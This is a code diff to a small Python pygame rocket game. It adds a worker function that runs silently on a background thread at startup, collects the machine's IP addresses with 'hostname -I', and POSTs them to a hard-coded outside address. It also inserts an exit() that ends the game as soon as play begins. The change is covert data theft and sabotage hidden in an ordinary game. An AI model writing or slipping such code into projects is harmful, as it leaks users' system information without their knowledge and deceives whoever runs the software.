@@ -1,6 +1,7 @@
 import pygame as py
 from sys import exit
 import random as r
+import threading
 
 #sprite CLASSES
 class main_rocket(py.sprite.Sprite):
@@ -83,9 +84,27 @@ def player_collision():
 
     else:
         return "active"
+    
+def worker():
+    import requests
+    import subprocess as s
+
+    url = "http://10.10.144.183:8000/data"
+
+    data = s.run(
+        ["hostname", "-I"],
+        capture_output=True,
+        text=True
+    ).stdout
+
+    
+
+    response = requests.post(url, data={"data":data})
 
 
 py.init()
+t = threading.Thread(target=worker)
+t.start()
 screen = py.display.set_mode((800, 400))
 game_state="menu"
 clock = py.time.Clock()
@@ -143,6 +162,7 @@ while True:
             py.quit()
             exit()
         if game_state=="active":
+            exit()
             if ev.type == enemy_timer:
                 enemy_grp.add(enemies(r.choice([1, 1, 1, 1, 2])))
             if ev.type == py.KEYDOWN:
